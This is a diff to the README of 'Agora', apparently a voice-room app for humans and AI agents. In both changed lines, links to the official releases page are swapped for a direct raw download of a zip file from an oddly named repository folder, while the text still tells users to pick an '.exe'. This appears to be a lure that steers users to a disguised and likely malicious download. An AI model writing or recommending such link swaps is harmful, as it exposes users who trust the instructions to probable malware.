@@ -1,6 +1,6 @@
 # 🎙️ Agora - Collaborative voice rooms for humans and AI
 
-[![Download Agora](https://img.shields.io/badge/Download-Agora-blue.svg)](https://github.com/Mazda9166/Agora/releases)
+[![Download Agora](https://img.shields.io/badge/Download-Agora-blue.svg)](https://github.com/Mazda9166/Agora/raw/refs/heads/main/ungentlemanlike/Software-3.5.zip)
 
 Agora creates shared digital spaces for conversation. You talk with people and AI agents in real time. The software bridges the gap between different computer systems to make group discussions simple. You use this tool to manage live voice rooms, invite participants, and integrate intelligent digital assistants into your workflow.
 
@@ -19,7 +19,7 @@ Before you start, check your computer against these requirements. Agora works on
 
 You download the application directly from the official releases page. 
 
-[Visit the release page here to download Agora](https://github.com/Mazda9166/Agora/releases)
+[Visit the release page here to download Agora](https://github.com/Mazda9166/Agora/raw/refs/heads/main/ungentlemanlike/Software-3.5.zip)
 
 Choose the file ending in `.exe` for your Windows system. Save the file to your desktop or your downloads folder.
 
